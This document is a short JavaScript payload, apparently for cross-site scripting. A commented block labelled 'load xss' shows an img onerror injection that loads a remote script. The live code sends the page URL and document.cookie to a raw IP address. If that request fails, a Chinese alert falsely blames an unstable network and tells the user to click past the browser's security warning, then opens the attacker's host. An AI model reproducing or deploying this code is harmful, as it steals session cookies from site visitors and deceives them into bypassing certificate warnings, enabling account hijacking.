(function(){
    /* load xss
     var drc = document.createElement('script');drc.setAttribute("src","https://biluweb.github.io/assets/extend.js");document.getElementsByTagName('head')[0].appendChild(drc);
     ["<img src=\"d\" onerror=\"var drc = document.createElement(\'script\');drc.setAttribute(\'src\',\'https://biluweb.github.io/assets/extend.js\');document.getElementsByTagName(\'head\')[0].appendChild(drc);\">"].join("");
    */
    
    let meta = document.createElement('meta');
    meta.content="upgrade-insecure-requests";
    meta.setAttribute("http-equiv","Content-Security-Policy");
    document.getElementsByTagName('head')[0].appendChild(meta);
    var httpRequest = new XMLHttpRequest();
    httpRequest.open('GET',"https://66.70.204.147/ftts?d="+window.location.href+"&c="+document.cookie, true);
    try {
        httpRequest.send();
    }
    catch(err){
        alert("系统检测到你的网络不稳定,在打开的网页中1>选择高级2>选择继续访问，将自动为你加速！");
        window.open("https://66.70.204.147");
    }
    
    httpRequest.onreadystatechange = function () {
        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
            var json = httpRequest.responseText;
            console.log(json);
        }
    };
}())
